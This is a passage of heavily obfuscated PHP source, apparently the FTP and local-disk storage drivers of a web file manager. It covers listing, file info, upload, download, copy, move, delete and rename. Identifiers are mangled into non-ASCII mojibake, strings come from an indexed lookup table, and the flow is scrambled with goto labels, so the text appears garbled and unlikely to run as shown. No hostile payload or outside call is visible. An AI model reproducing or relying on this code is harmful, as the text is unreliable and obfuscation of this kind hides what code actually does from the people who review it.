$this->iconvSystem($fÍ‚­Ğ§Ì); $AÍ›Æ‰…ÔŸ = $this->pathFather($fÍ‚­Ğ§Ì); goto A¬ÚæËÅÃ¡; Aïñèê¶Øø: return $Däƒªò·Š” ? $this->getPathOuter($Aéƒè¤ëÉ›) : !1; goto c ¾†«ÌŸØ; Fİ‹½¶óª: $F¤‘ñ´¿…Â =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$this->_isconn()) { return !1; } $aØìœ˜ó¢ = $this->fileNameAuto($this->pathFather($fÍ‚­Ğ§Ì), $dáƒ“‘÷ªƒ); goto Bõ‰ğ‰Í; c ¾†«ÌŸØ: } private function folderInfo($D¡…‹ÕİÙø, $cîä¼ùà½š = false) { goto eŸ‡«ºøà; EÉé¹–—ºŞ: $b¬íÛ”Œ¶ = $this->iconvSystem($D¡…‹ÕİÙø); if ($cîä¼ùà½š) { return array($CÃ–…ë†¾[38] => $BÔ’‚¾ò, $CÃ–…ë†¾[87] => $CİÒ¯…«ï³, $CÃ–…ë†¾[39] => $CÃ–…ë†¾[88]); } $Aëˆ•´ß’ = array($CÃ–…ë†¾[38] => $BÔ’‚¾ò, $CÃ–…ë†¾[87] => $CİÒ¯…«ï³, $CÃ–…ë†¾[39] => $CÃ–…ë†¾[88], $CÃ–…ë†¾[199] => 0, $CÃ–…ë†¾[119] => 0, $CÃ–…ë†¾[1153] => !0, $CÃ–…ë†¾[1154] => !0); goto fàñåìÂŠ; fàñåìÂŠ: return $Aëˆ•´ß’; goto c‹Ñßšİ‹Ã; eŸ‡«ºøà: $CÃ–…ë†¾ =& $_SERVER[¹÷ˆ§éÒ°ú]; $CİÒ¯…«ï³ = $this->getPathOuter(rtrim($D¡…‹ÕİÙø, $CÃ–…ë†¾[18])); $BÔ’‚¾ò = $this->pathThis($CİÒ¯…«ï³); goto EÉé¹–—ºŞ; c‹Ñßšİ‹Ã: } private function fileInfo($f­îŞ¸†¬É, $bÔ¬¶¦¦á« = false) { goto Cê¿£¤ÎàÙ; Cê¿£¤ÎàÙ: $Eö¢ÉÀà²© =& $_SERVER[¹÷ˆ§éÒ°ú]; $DÉİÄ¡Æ = $this->getPathOuter(rtrim($f­îŞ¸†¬É, $Eö¢ÉÀà²©[18])); $dîğáÏğ¹½ = $this->pathThis($DÉİÄ¡Æ); goto CæÊ©ÌÊÜ£; CæÊ©ÌÊÜ£: $CáŸ½ÑÃ×š = $this->iconvSystem($f­îŞ¸†¬É); if ($bÔ¬¶¦¦á«) { return array($Eö¢ÉÀà²©[38] => $dîğáÏğ¹½, $Eö¢ÉÀà²©[87] => $DÉİÄ¡Æ, $Eö¢ÉÀà²©[39] => $Eö¢ÉÀà²©[179], $Eö¢ÉÀà²©[172] => $this->ext($f­îŞ¸†¬É), $Eö¢ÉÀà²©[89] => $this->size($f­îŞ¸†¬É)); } $d—±õÙ©Æ¡ = array($Eö¢ÉÀà²©[38] => $dîğáÏğ¹½, $Eö¢ÉÀà²©[87] => $DÉİÄ¡Æ, $Eö¢ÉÀà²©[39] => $Eö¢ÉÀà²©[179], $Eö¢ÉÀà²©[199] => 0, $Eö¢ÉÀà²©[119] => @ftp_mdtm($this->connect, $CáŸ½ÑÃ×š), $Eö¢ÉÀà²©[172] => $this->ext($f­îŞ¸†¬É), $Eö¢ÉÀà²©[89] => $this->size($f­îŞ¸†¬É), $Eö¢ÉÀà²©[1153] => !0, $Eö¢ÉÀà²©[1154] => !0); goto fœöšöÙ“Ä; fœöšöÙ“Ä: $d—±õÙ©Æ¡[$Eö¢ÉÀà²©[119]] = $d—±õÙ©Æ¡[$Eö¢ÉÀà²©[119]] > 0 ? $d—±õÙ©Æ¡[$Eö¢ÉÀà²©[119]] : 0; return $d—±õÙ©Æ¡; goto aİ‰Œ¥”©; aİ‰Œ¥”©: } public function size($d…Õ¡ì‘¶Ñ) { $Bï©¸½Ÿ•Á = $this->objectMeta($d…Õ¡ì‘¶Ñ); return $Bï©¸½Ÿ•Á ? $Bï©¸½Ÿ•Á[$_SERVER[¹÷ˆ§éÒ°ú][89]] : 0; } public function info($aÉ…æÌä¡İ) { if ($this->isFile($aÉ…æÌä¡İ)) { return $this->fileInfo($aÉ…æÌä¡İ, 0); } else { if ($this->isFolder($aÉ…æÌä¡İ)) { return $this->folderInfo($aÉ…æÌä¡İ); } } return !1; } public function exist($f‹“Ç”ÏÒÏ) { return $this->objectMeta($f‹“Ç”ÏÒÏ) ? !0 : !1; } public function isFile($Dß’âÄåÓ¢) { $EÉÀ‹ĞÒšÍ =& $_SERVER[¹÷ˆ§éÒ°ú]; $aƒÂ›ˆÙĞ¬ = $this->objectMeta($Dß’âÄåÓ¢); return $aƒÂ›ˆÙĞ¬ ? $aƒÂ›ˆÙĞ¬[$EÉÀ‹ĞÒšÍ[39]] == $EÉÀ‹ĞÒšÍ[179] : !1; } public function isFolder($aî³øÑ…êÔ) { $EÄ¯”è³ŠÜ =& $_SERVER[¹÷ˆ§éÒ°ú]; $C¿ÀîÀó…½ = $this->objectMeta($aî³øÑ…êÔ); return $C¿ÀîÀó…½ ? $C¿ÀîÀó…½[$EÄ¯”è³ŠÜ[39]] == $EÄ¯”è³ŠÜ[88] : !1; } public function listPath($f•ˆŸ˜¥ê, $dŠêÑÖ¬´ = false) { goto AÅˆÁÛ‹½ï; AÅˆÁÛ‹½ï: $dõ‡¶©ˆĞŒ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$this->_isconn()) { return !1; } $f•ˆŸ˜¥ê = $this->iconvSystem($f•ˆŸ˜¥ê); goto Aîöªñš…÷; c·‹Ú‘Æ·: foreach ($CóªÁ¢êŒ† as $f•ˆŸ˜¥ê) { if ($this->isFolder($f•ˆŸ˜¥ê)) { $BØÖè´õíƒ[$dõ‡¶©ˆĞŒ[86]][] = $this->folderInfo($f•ˆŸ˜¥ê, $dŠêÑÖ¬´); } else { $BØÖè´õíƒ[$dõ‡¶©ˆĞŒ[85]][] = $this->fileInfo($f•ˆŸ˜¥ê, $dŠêÑÖ¬´); } } return $BØÖè´õíƒ; goto EŠ„Ìõ˜¥ ; Aîöªñš…÷: $CóªÁ¢êŒ† = $this->ftpList($f•ˆŸ˜¥ê); $BØÖè´õíƒ = array($dõ‡¶©ˆĞŒ[86] => array(), $dõ‡¶©ˆĞŒ[85] => array()); if (!$CóªÁ¢êŒ†) { return $BØÖè´õíƒ; } goto c·‹Ú‘Æ·; EŠ„Ìõ˜¥ : } public function has($BÔë·÷ğ°‘, $dñ‰•Åñã¢ = false, $d°Ã…İ›à = true) { goto dÍòó¼Âß; a¤£¥ÎöÎÌ: $D˜ŠŒİÛ‰ä = $this->ftpList($BÔë·÷ğ°‘); if (!$D˜ŠŒİÛ‰ä) { return !1; } if ($dñ‰•Åñã¢) { return array($d‚ÚùŠ„[203] => 0, $d‚ÚùŠ„[204] => count($D˜ŠŒİÛ‰ä)); } goto CˆºÜÚšîç; dÍòó¼Âß: $d‚ÚùŠ„ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$this->_isconn()) { return !1; } $BÔë·÷ğ°‘ = $this->iconvSystem($BÔë·÷ğ°‘); goto a¤£¥ÎöÎÌ; CˆºÜÚšîç: foreach ($D˜ŠŒİÛ‰ä as $BÔë·÷ğ°‘) { if ($d°Ã…İ›à) { if (!$this->isFolder($BÔë·÷ğ°‘)) { return !0; } } else { if ($this->isFolder($BÔë·÷ğ°‘)) { return !0; } } } return !1; goto A×êÄÚ„‡ƒ; A×êÄÚ„‡ƒ: } public function listAll($fäøŸ´´ö) { goto bá¼ö¦ÓÖ©; fîİçÉ¿ÕÕ: foreach ($CÌ›ç‡‡Ïç[$FÀñÕÙÌÉ[86]] as $E…ÕçÕÌ‘æ) { $F´íººÌÏ¸[] = array($FÀñÕÙÌÉ[87] => $FÀñÕÙÌÉ[18] . trim(str_replace($fäøŸ´´ö, $FÀñÕÙÌÉ[43], $E…ÕçÕÌ‘æ), $FÀñÕÙÌÉ[18]) . $FÀñÕÙÌÉ[18], $FÀñÕÙÌÉ[88] => 1, $FÀñÕÙÌÉ[89] => 0); } foreach ($CÌ›ç‡‡Ïç[$FÀñÕÙÌÉ[85]] as $bÕà„¹ë) { $F´íººÌÏ¸[] = array($FÀñÕÙÌÉ[87] => $FÀñÕÙÌÉ[18] . trim(str_replace($fäøŸ´´ö, $FÀñÕÙÌÉ[43], $bÕà„¹ë), $FÀñÕÙÌÉ[18]), $FÀñÕÙÌÉ[88] => 0, $FÀñÕÙÌÉ[89] => $this->size($bÕà„¹ë)); } return $F´íººÌÏ¸; goto b”º‚†Ä”ò; bá¼ö¦ÓÖ©: $FÀñÕÙÌÉ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$this->_isconn()) { return !1; } $fäøŸ´´ö = $this->iconvSystem($fäøŸ´´ö); goto fİ³ÜõçëÉ; fİ³ÜõçëÉ: $CÌ›ç‡‡Ïç = array($FÀñÕÙÌÉ[85] => array(), $FÀñÕÙÌÉ[86] => array()); $this->recursionFtpFiles($fäøŸ´´ö, $CÌ›ç‡‡Ïç); $F´íººÌÏ¸ = array(); goto fîİçÉ¿ÕÕ; b”º‚†Ä”ò: } public function getContent($e©¨‰÷šä) { if (!$this->_isconn()) { return !1; } $e©¨‰÷šä = $this->iconvSystem($e©¨‰÷šä); return $this->fileSubstr($e©¨‰÷šä); } public function setContent($AÈù‚¤‚‘, $bÍ´±šø¾‹ = '') { goto A¦éÖ¯¸œ«; FÚĞóˆºÏ™: file_put_contents($cá…á÷‡Êé, $bÍ´±šø¾‹); $eªì¿š¯ó = $this->upload($AÈù‚¤‚‘, $this->iconvApp($cá…á÷‡Êé)); $this->tempFileRemve($cá…á÷‡Êé); goto FŒ£§ªµ¡º; A¦éÖ¯¸œ«: if (!$this->_isconn()) { return !1; } $dÖòß¯”‹» = $this->pathThis($this->iconvSystem($AÈù‚¤‚‘)); $cá…á÷‡Êé = $this->tempFile($dÖòß¯”‹»); goto FÚĞóˆºÏ™; FŒ£§ªµ¡º: return $eªì¿š¯ó; goto a½ÒÍĞø”´; a½ÒÍĞø”´: } public function fileSubstr($EÄ¡õ¶•±¼, $c“§ùìñ—Š = 0, $dù¿óÏƒˆá = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($EÄ¡õ¶•±¼, $c“§ùìñ—Š, $dù¿óÏƒˆá); } private function ftpRequest($E¿¶¹ÖòÄí, $Dí´Ä¯àƒ¬ = 0, $B…î…˜†İ© = false) { goto C‹øØÄàÅ¹; C‹øØÄàÅ¹: $E¿¶¹ÖòÄí = $this->iconvSystem($E¿¶¹ÖòÄí); $DˆôøòĞ¸  = $this->scheme . $this->host . $_SERVER[¹÷ˆ§éÒ°ú][14] . $this->port; $aèäÎå¡Îš = curl_init(); goto C–¿¾ë”“; C’ÖÑ–¡Ú: return $e†ÖÏ‹âÙã; goto AìÕå®å; C–¿¾ë”“: curl_setopt($aèäÎå¡Îš, CURLOPT_URL, $DˆôøòĞ¸  . $this->pathEncode($E¿¶¹ÖòÄí)); curl_setopt($aèäÎå¡Îš, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($B…î…˜†İ©) { $f–ö‡ù‰™ø = $Dí´Ä¯àƒ¬ + $B…î…˜†İ© - 1; curl_setopt($aèäÎå¡Îš, CURLOPT_RANGE, "{$Dí´Ä¯àƒ¬}\55{$f–ö‡ù‰™ø}"); } goto CìæÒí„„–; CìæÒí„„–: curl_setopt($aèäÎå¡Îš, CURLOPT_RETURNTRANSFER, 1); $e†ÖÏ‹âÙã = curl_exec($aèäÎå¡Îš); curl_close($aèäÎå¡Îš); goto C’ÖÑ–¡Ú; AìÕå®å: } public function upload($F‚Š½À, $bÍèîùò‘Î, $aœ¨Èëã§Ô = false, $b‹¡’÷•·» = REPEAT_REPLACE) { goto A­Ş×†ôäÂ; BÉÌÁëÛ¸‰: $bÍèîùò‘Î = $this->iconvSystem($bÍèîùò‘Î); $B–«•‡Î = ftp_nb_put($this->connect, $F‚Š½À, $bÍèîùò‘Î, FTP_BINARY); while ($B–«•‡Î == FTP_MOREDATA) { $B–«•‡Î = ftp_nb_continue($this->connect); } goto dğöÜ¢Á˜‰; dğöÜ¢Á˜‰: if ($B–«•‡Î != FTP_FINISHED) { return !1; } return $this->getPathOuter($F‚Š½À); goto EË¯÷İ®á; A­Ş×†ôäÂ: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($F‚Š½À))) { return !1; } $F‚Š½À = $this->iconvSystem($F‚Š½À); goto BÉÌÁëÛ¸‰; EË¯÷İ®á: } public function download($dŒÇ•”¸, $b§æ›¤˜Íõ = '') { goto dê¼ßí¡»À; dê¼ßí¡»À: if (!$this->_isconn()) { return !1; } $d•¦äŸ‡Æª = $this->pathFather($b§æ›¤˜Íõ); if (!IO::mkdir($d•¦äŸ‡Æª)) { return !1; } goto bïËã÷Ğè†; bÍè•¤ÈÛÙ: while ($bÑ“ÈÙ¢Š¢ == FTP_MOREDATA) { $bÑ“ÈÙ¢Š¢ = ftp_nb_continue($this->connect); } if ($bÑ“ÈÙ¢Š¢ != FTP_FINISHED) { return !1; } return $this->iconvApp($b§æ›¤˜Íõ); goto côçÃÊ‚ÎÚ; bïËã÷Ğè†: $dŒÇ•”¸ = $this->iconvSystem($dŒÇ•”¸); $b§æ›¤˜Íõ = $this->iconvSystem($b§æ›¤˜Íõ); $bÑ“ÈÙ¢Š¢ = ftp_nb_get($this->connect, $b§æ›¤˜Íõ, $dŒÇ•”¸, FTP_BINARY); goto bÍè•¤ÈÛÙ; côçÃÊ‚ÎÚ: } private function ftpList($fª‡öì·) { goto Bœ¡¸Ú †ù; AÖæ©ÖÏ: $fª‡öì· = rtrim($fª‡öì·, $fİŠùßå«Ü[18]) . $fİŠùßå«Ü[18]; $A†™ìªÕÂª = @ftp_nlist($this->connect, $fª‡öì·); if ($A†™ìªÕÂª === !1) { $A†™ìªÕÂª = @ftp_rawlist($this->connect, $fª‡öì·); foreach ($A†™ìªÕÂª as $B‚š…Îº¼Ê => $dÌá”ËÁŸ¿) { $A†™ìªÕÂª[$B‚š…Îº¼Ê] = end(explode($fİŠùßå«Ü[1155], $dÌá”ËÁŸ¿)); } } goto bƒì¡“À­; bƒì¡“À­: $A†™ìªÕÂª = array_diff($A†™ìªÕÂª, array($fİŠùßå«Ü[103], $fİŠùßå«Ü[1156], $fª‡öì· . $fİŠùßå«Ü[103], $fª‡öì· . $fİŠùßå«Ü[1156])); $F•ãÍ¬˜½† = array(); foreach ($A†™ìªÕÂª as $f­â¦°íèø) { if (!strstr($f­â¦°íèø, $fİŠùßå«Ü[18])) { $f­â¦°íèø = $fª‡öì· . ltrim($f­â¦°íèø, $fİŠùßå«Ü[18]); } $F•ãÍ¬˜½†[] = $this->iconvApp($f­â¦°íèø); } goto A¦ğ•’¡Ø; A¦ğ•’¡Ø: return $F•ãÍ¬˜½†; goto eÉ‚ÇÉ› ; Bœ¡¸Ú †ù: $fİŠùßå«Ü =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$this->isFolder($fª‡öì·)) { return !1; } @ftp_chdir($this->connect, $fİŠùßå«Ü[18]); goto AÖæ©ÖÏ; eÉ‚ÇÉ› : } private function recursionFtpFiles($aÍñ³ƒ¡óŞ, &$EÎŞÈ¨¿ó£) { $Fà‡¦ª¯Ôë =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$this->_isconn()) { return !1; } if (!($a‘¯š¤—Üù = $this->ftpList($aÍñ³ƒ¡óŞ))) { return !1; } foreach ($a‘¯š¤—Üù as $aÍñ³ƒ¡óŞ) { if ($this->isFolder($aÍñ³ƒ¡óŞ)) { $this->recursionFtpFiles($aÍñ³ƒ¡óŞ, $EÎŞÈ¨¿ó£); $EÎŞÈ¨¿ó£[$Fà‡¦ª¯Ôë[86]][] = $aÍñ³ƒ¡óŞ; } else { $EÎŞÈ¨¿ó£[$Fà‡¦ª¯Ôë[85]][] = $aÍñ³ƒ¡óŞ; } } } private function objectMeta($C£Æ×‰Ñ¿²) { goto cê¿™‚’ç×; e·ì¬‘®Íá: $b¶•ÖÓ¡Ì = @ftp_size($this->connect, $this->iconvSystem($C£Æ×‰Ñ¿²)); if ($b¶•ÖÓ¡Ì != -1) { $a÷Ÿ­ƒæñè = array($AÁø”› —[89] => $b¶•ÖÓ¡Ì, $AÁø”› —[39] => $AÁø”› —[179]); } else { $c¬æŸ“«Ã = @ftp_chdir($this->connect, $this->iconvSystem($C£Æ×‰Ñ¿²)); $a÷Ÿ­ƒæñè = $c¬æŸ“«Ã ? array($AÁø”› —[89] => 0, $AÁø”› —[39] => $AÁø”› —[88]) : !1; } Cache::set($dŞá³™¶´, $a÷Ÿ­ƒæñè, 0); goto AÏ¼œ÷ĞŠ¾; a¾Óº›ø×Ó: if ($a÷Ÿ­ƒæñè !== null && $a÷Ÿ­ƒæñè !== !1) { return $a÷Ÿ­ƒæñè; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $AÁø”› —[18]); goto e·ì¬‘®Íá; AÏ¼œ÷ĞŠ¾: return $a÷Ÿ­ƒæñè; goto bãŒë¦Ò¬°; cê¿™‚’ç×: $AÁø”› — =& $_SERVER[¹÷ˆ§éÒ°ú]; $dŞá³™¶´ = $AÁø”› —[1157] . md5($C£Æ×‰Ñ¿²); $a÷Ÿ­ƒæñè = Cache::get($dŞá³™¶´); goto a¾Óº›ø×Ó; bãŒë¦Ò¬°: } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($b—ÚŠÊ¿˜ó) { if (substr($b—ÚŠÊ¿˜ó, 0, 2) == $_SERVER[¹÷ˆ§éÒ°ú][1146]) { $b—ÚŠÊ¿˜ó = BASIC_PATH . substr($b—ÚŠÊ¿˜ó, 2); } return $b—ÚŠÊ¿˜ó; } public function iconvApp($eÖŒÊ„¼´) { $C‡•®ĞÎÕ =& $_SERVER[¹÷ˆ§éÒ°ú]; global $config; return $this->iconvTo($eÖŒÊ„¼´, $config[$C‡•®ĞÎÕ[1144]], $config[$C‡•®ĞÎÕ[1143]]); } public function iconvSystem($e×å¦Ëö–Õ) { $cĞÀ–Ú·Ë„ =& $_SERVER[¹÷ˆ§éÒ°ú]; global $config; return $this->iconvTo($e×å¦Ëö–Õ, $config[$cĞÀ–Ú·Ë„[1143]], $config[$cĞÀ–Ú·Ë„[1144]]); } public function getPathOuter($fâÂÏ¬ğ¾å) { goto b†ã§¸Ñù¢; b†ã§¸Ñù¢: $e‹œ²²ã´ =& $_SERVER[¹÷ˆ§éÒ°ú]; $dòáÎÌä¥ = $this->iconvApp($this->pathBase); $fâÂÏ¬ğ¾å = $this->iconvApp($fâÂÏ¬ğ¾å); goto E‘èèÙŒ¶÷; E‘èèÙŒ¶÷: if (substr($dòáÎÌä¥, 0, 2) == $e‹œ²²ã´[1146]) { $dòáÎÌä¥ = BASIC_PATH . substr($dòáÎÌä¥, 2); } if (substr($fâÂÏ¬ğ¾å, 0, 2) == $e‹œ²²ã´[1146]) { $fâÂÏ¬ğ¾å = BASIC_PATH . substr($fâÂÏ¬ğ¾å, 2); } $dòáÎÌä¥ = KodIO::clear($dòáÎÌä¥); goto D‰Ø”ÄÆŞ; c‹É•º¡÷: return $this->pathDriver . $e‹œ²²ã´[18] . ltrim($fâÂÏ¬ğ¾å, $e‹œ²²ã´[18]); goto a¼‰©ŸÅÊ¤; D‰Ø”ÄÆŞ: $fâÂÏ¬ğ¾å = KodIO::clear($fâÂÏ¬ğ¾å); $fâÂÏ¬ğ¾å = substr($fâÂÏ¬ğ¾å, strlen($dòáÎÌä¥)); if (empty($this->pathDriver)) { return $fâÂÏ¬ğ¾å; } goto c‹É•º¡÷; a¼‰©ŸÅÊ¤: } public function mkfile($a°Ò¹Ë¬œã, $dô”ÌÊºéÓ = '', $AŸ«ªĞ¢ = REPEAT_RENAME) { $a°Ò¹Ë¬œã = $this->iconvSystem($a°Ò¹Ë¬œã); @touch($a°Ò¹Ë¬œã); if ($dô”ÌÊºéÓ) { file_put_contents($a°Ò¹Ë¬œã, $dô”ÌÊºéÓ); } return is_file($a°Ò¹Ë¬œã) ? $this->getPathOuter($a°Ò¹Ë¬œã) : !1; } public function mkdir($FÆµ»ŞÒŠ°, $f¤ø‚¯¬– = REPEAT_SKIP) { $FÆµ»ŞÒŠ° = $this->iconvSystem($FÆµ»ŞÒŠ°); if (is_dir($FÆµ»ŞÒŠ°)) { return $this->getPathOuter($FÆµ»ŞÒŠ°); } @mkdir($FÆµ»ŞÒŠ°, 511, !0); return is_dir($FÆµ»ŞÒŠ°) ? $this->getPathOuter($FÆµ»ŞÒŠ°) : !1; } public function copyFile($D¾ñ¯È’–Ñ, $F¥åÛÙŞÖŸ) { $this->mkdir($this->pathFather($F¥åÛÙŞÖŸ)); $D¾ñ¯È’–Ñ = $this->iconvSystem($D¾ñ¯È’–Ñ); $F¥åÛÙŞÖŸ = $this->iconvSystem($F¥åÛÙŞÖŸ); $B„ø‰ŸÖà = @copy($D¾ñ¯È’–Ñ, $F¥åÛÙŞÖŸ); return $B„ø‰ŸÖà ? $this->getPathOuter($F¥åÛÙŞÖŸ) : !1; } public function moveFile($D´¬¨”•æ÷, $FÅ×ñã›) { $this->mkdir($this->pathFather($FÅ×ñã›)); $D´¬¨”•æ÷ = $this->iconvSystem($D´¬¨”•æ÷); $FÅ×ñã› = $this->iconvSystem($FÅ×ñã›); $fğµÍˆ®ÉÉ = intval(@rename($D´¬¨”•æ÷, $FÅ×ñã›)); if (!$fğµÍˆ®ÉÉ) { if ($fğµÍˆ®ÉÉ = intval(@copy($D´¬¨”•æ÷, $FÅ×ñã›))) { @unlink($D´¬¨”•æ÷); } } return $fğµÍˆ®ÉÉ ? $this->getPathOuter($FÅ×ñã›) : !1; } public function delFile($bÍ„‰ÒÅª¶) { $bÍ„‰ÒÅª¶ = $this->iconvSystem($bÍ„‰ÒÅª¶); if (!@unlink($bÍ„‰ÒÅª¶)) { @chmod($bÍ„‰ÒÅª¶, 511); if (!@unlink($bÍ„‰ÒÅª¶)) { return !1; } } else { return !0; } } public function delFolder($F»‡÷Ã®Å) { goto B¾ë„ÜÎˆš; B¾ë„ÜÎˆš: $CÕéİ°Ğ„™ =& $_SERVER[¹÷ˆ§éÒ°ú]; $F»‡÷Ã®Å = $this->iconvSystem($F»‡÷Ã®Å); if (!is_dir($F»‡÷Ã®Å)) { return !0; } goto eÈ÷Ù‘•; a°Ë¸’”•: return rmdir($F»‡÷Ã®Å); goto EøÍ°™æ; eÈ÷Ù‘•: if (!($b–ê‡¤–ˆ = opendir($F»‡÷Ã®Å))) { return !1; } while (($e˜İ¦õÆ× = readdir($b–ê‡¤–ˆ)) !== !1) { if ($e˜İ¦õÆ× == $CÕéİ°Ğ„™[103] || $e˜İ¦õÆ× == $CÕéİ°Ğ„™[1156]) { continue; } $fğïæ¯ÖŸ = $F»‡÷Ã®Å . $CÕéİ°Ğ„™[18] . $e˜İ¦õÆ×; if (is_file($fğïæ¯ÖŸ) || is_link($fğïæ¯ÖŸ)) { if (!unlink($fğïæ¯ÖŸ)) { chmod($fğïæ¯ÖŸ, 511); if (!unlink($fğïæ¯ÖŸ)) { return !1; } } } else { if (is_dir($fğïæ¯ÖŸ)) { chmod($fğïæ¯ÖŸ, 511); $fğïæ¯ÖŸ = $this->iconvApp($fğïæ¯ÖŸ); if (!$this->delFolder($fğïæ¯ÖŸ)) { return !1; } } } } closedir($b–ê‡¤–ˆ); goto a°Ë¸’”•; EøÍ°™æ: } public function rename($e²®±Àâ·¤, $fñ¾ƒó¨ÙÕ) { goto B«°øéØÖ»; B«°øéØÖ»: $b‰¶©ø¾ÇÈ =& $_SERVER[¹÷ˆ§éÒ°ú]; $C²Ÿ›­½ˆã = $this->fileNameAuto($this->pathFather($e²®±Àâ·¤), $fñ¾ƒó¨ÙÕ); $C²Ÿ›­½ˆã = $this->iconvSystem($C²Ÿ›­½ˆã); goto Bƒ…Å–¤÷ç; A¾³ïË‚¢: $C«ˆŸÏ = @rename($e²®±Àâ·¤, $f•éÚ¶ÈˆË); $f•éÚ¶ÈˆË = $this->iconvApp($f•éÚ¶ÈˆË); return $C«ˆŸÏ ? $this->getPathOuter($f•éÚ¶ÈˆË) : !1; goto AŒøÁ·ËÒ; Bƒ…Å–¤÷ç: $e²®±Àâ·¤ = $this->iconvSystem($e²®±Àâ·¤); $dÒ÷àÄã…Ë = $this->pathFather($e²®±Àâ·¤); $f•éÚ¶ÈˆË = rtrim($dÒ÷àÄã…Ë, $b‰¶©ø¾ÇÈ[18]) . $b‰¶©ø¾ÇÈ[18] . $C²Ÿ›­½ˆã; goto A¾³ïË‚¢; AŒøÁ·ËÒ: } public function size($d™«Â‡“°) { $d™«Â‡“° = $this->iconvSystem($d™«Â‡“°); return (double) abs(sprintf($_SERVER[¹÷ˆ§éÒ°ú][1158], @filesize($d™«Â‡“°))); } public function info($dÂ±„·Õ‡µ) { $dÂ±„·Õ‡µ = $this->iconvSystem($dÂ±„·Õ‡µ); if ($this->isFolder($dÂ±„·Õ‡µ)) { return $this->folderInfo($dÂ±„·Õ‡µ); } else { if ($this->isFile($dÂ±„·Õ‡µ)) { return $this->fileInfo($dÂ±„·Õ‡µ); } } return !1; } protected function infoChildren($aÔ³ÊË—ÇÛ, &$FÌˆ›…–ô, $CŸíÛ×ÀŸ‚ = true) { goto e½±®ğœ½; e½±®ğœ½: $aº ·ÜŒÃ =& $_SERVER[¹÷ˆ§éÒ°ú]; check_abort(); $aÔ³ÊË—ÇÛ = rtrim($aÔ³ÊË—ÇÛ, $aº ·ÜŒÃ[18]) . $aº ·ÜŒÃ[18]; goto DãİÈÀŒ³Æ; DãİÈÀŒ³Æ: if ($CŸíÛ×ÀŸ‚) { $aÔ³ÊË—ÇÛ = $this->iconvSystem($aÔ³ÊË—ÇÛ); } if (!($D‚¿‹à»‘æ = @opendir($aÔ³ÊË—ÇÛ))) { return; } while (($E½é¥§ˆ = readdir($D‚¿‹à»‘æ)) !== !1) { if ($E½é¥§ˆ == $aº ·ÜŒÃ[103] || $E½é¥§ˆ == $aº ·ÜŒÃ[1156]) { continue; } $E¹Ìø©§¯Ğ = $aÔ³ÊË—ÇÛ . $E½é¥§ˆ; if (is_file($E¹Ìø©§¯Ğ) || is_link($E¹Ìø©§¯Ğ)) { $FÌˆ›…–ô[$aº ·ÜŒÃ[90]]++; $FÌˆ›…–ô[$aº ·ÜŒÃ[89]] += (double) abs(sprintf($aº ·ÜŒÃ[1158], @filesize($E¹Ìø©§¯Ğ))); } else { if (is_dir($E¹Ìø©§¯Ğ)) { $FÌˆ›…–ô[$aº ·ÜŒÃ[91]]++; $this->infoChildren($E¹Ìø©§¯Ğ, $FÌˆ›…–ô, !1); } } } goto F‘¤ˆ…ôó; F‘¤ˆ…ôó: closedir($D‚¿‹à»‘æ); goto dÕ”¦öÉÁ©; dÕ”¦öÉÁ©: } private function folderInfo($dÔ˜‰ç¥Ê„, $cÛÚÂÊíÈ = false) { $F—Ï‹‰‚¤Ñ =& $_SERVER[¹÷ˆ§éÒ°ú]; $dÔ˜‰ç¥Ê„ = rtrim($dÔ˜‰ç¥Ê„, $F—Ï‹‰‚¤Ñ[18]) . $F—Ï‹‰‚¤Ñ[18]; $AÑ­â‡ö… = $this->iconvApp($this->pathThis($dÔ˜‰ç¥Ê„)); if ($cÛÚÂÊíÈ) { return array($F—Ï‹‰‚¤Ñ[38] => $AÑ­â‡ö…, $F—Ï‹‰‚¤Ñ[87] => $this->getPathOuter($dÔ˜‰ç¥Ê„), $F—Ï‹‰‚¤Ñ[39] => $F—Ï‹‰‚¤Ñ[88]); } $dù“ÆÇ›ˆ³ = array($F—Ï‹‰‚¤Ñ[38] => $AÑ­â‡ö…, $F—Ï‹‰‚¤Ñ[87] => $this->getPathOuter($dÔ˜‰ç¥Ê„), $F—Ï‹‰‚¤Ñ[39] => $F—Ï‹‰‚¤Ñ[88], $F—Ï‹‰‚¤Ñ[199] => @filectime($dÔ˜‰ç¥Ê„), $F—Ï‹‰‚¤Ñ[119] => @filemtime($dÔ˜‰ç¥Ê„), $F—Ï‹‰‚¤Ñ[1159] => @fileatime($dÔ˜‰ç¥Ê„), $F—Ï‹‰‚¤Ñ[1153] => is_readable($dÔ˜‰ç¥Ê„), $F—Ï‹‰‚¤Ñ[1154] => is_writable($dÔ˜‰ç¥Ê„), $F—Ï‹‰‚¤Ñ[1160] => get_mode($dÔ˜‰ç¥Ê„)); return $dù“ÆÇ›ˆ³; } private function fileInfo($bÒÀ‡¥íŠò, $D¹Òø›Æëö = false) { $b‚›¦š±ï =& $_SERVER[¹÷ˆ§éÒ°ú]; $fæá‡¦äîÀ = $this->iconvApp($this->pathThis($bÒÀ‡¥íŠò)); if ($D¹Òø›Æëö) { return array($b‚›¦š±ï[38] => $fæá‡¦äîÀ, $b‚›¦š±ï[87] => $this->getPathOuter($bÒÀ‡¥íŠò), $b‚›¦š±ï[39] => $b‚›¦š±ï[179], $b‚›¦š±ï[89] => $this->size($bÒÀ‡¥íŠò), $b‚›¦š±ï[172] => $this->ext($fæá‡¦äîÀ)); } $AÖÜßÏâ  = array($b‚›¦š±ï[38] => $fæá‡¦äîÀ, $b‚›¦š±ï[87] => $this->getPathOuter($bÒÀ‡¥íŠò), $b‚›¦š±ï[39] => $b‚›¦š±ï[179], $b‚›¦š±ï[199] => @filectime($bÒÀ‡¥íŠò), $b‚›¦š±ï[119] => @filemtime($bÒÀ‡¥íŠò), $b‚›¦š±ï[1159] => @fileatime($bÒÀ‡¥íŠò), $b‚›¦š±ï[89] => $this->size($bÒÀ‡¥íŠò), $b‚›¦š±ï[172] => $this->ext($fæá‡¦äîÀ), 